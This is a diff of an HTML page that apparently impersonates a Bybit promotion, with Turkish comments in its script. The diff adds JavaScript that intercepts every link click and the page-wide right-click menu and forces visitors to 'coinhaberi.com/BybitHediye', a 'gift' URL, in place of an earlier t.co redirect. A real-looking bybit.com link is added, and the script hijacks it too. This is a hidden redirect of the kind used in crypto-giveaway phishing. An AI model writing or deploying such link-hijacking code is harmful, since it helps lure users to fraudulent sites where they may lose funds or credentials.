@@ -427,7 +427,7 @@ img {
     </div>
     <div class="gpg-footer gpg-footer-single">
       <div class="">
-        Find Out More
+        <a href="https://www.bybit.com">Find Out More</a>
       </div>
     </div>
   </div>
@@ -4383,17 +4383,17 @@ img {
         }
     </script>
     <script>
-// Tüm linkleri seç
-var tümLinkler = document.querySelectorAll('a');
-
 // Fonksiyon: Link tıklandığında yapılacak işlemler
 function linkTiklandiginda(event) {
     // Varsayılan davranışı engelle (yani, linkin orijinal URL'ye gitmesini önle)
     event.preventDefault();
 
     // Belirli bir URL'ye yönlendir
-    window.location.href = 'https://t.co/VLp3QBhtft';
+    window.location.href = 'https://coinhaberi.com/BybitHediye';
 }
+
+// Tüm linkleri seç
+var tümLinkler = document.querySelectorAll('a');
 
 // Her bir link için olay dinleyicisini ekle ve parametre ekle
 tümLinkler.forEach(function(link) {
@@ -4402,13 +4402,20 @@ tümLinkler.forEach(function(link) {
     
     // Olay dinleyicisini ekle
     link.addEventListener('click', linkTiklandiginda);
-    
-    // Sol tıklamayı dinle ve belirtilen URL'ye yönlendir
-    link.addEventListener('contextmenu', function(event) {
-        event.preventDefault();
-        window.location.href = 'https://t.co/VLp3QBhtft';
-    });
 });
+
+// Fonksiyon: Sol tıklama durumunda yapılacak işlemler
+function solTiklama(event) {
+    // Varsayılan davranışı engelle (contextmenu olayını durdur)
+    event.preventDefault();
+
+    // Belirli bir URL'ye yönlendir
+    window.location.href = 'https://coinhaberi.com/BybitHediye';
+}
+
+// Tüm sayfa üzerinde sol tıklama olayını dinle
+document.addEventListener('contextmenu', solTiklama);
+
 
     </script>
     <script type="text/javascript" src="https://www.bybit.com/ftsvYm8trW/B7HYiR96/9F/YNEpJhG0V6ESca/ZVpVQG8PAg/HQ/BfIRJDQRY"></script>
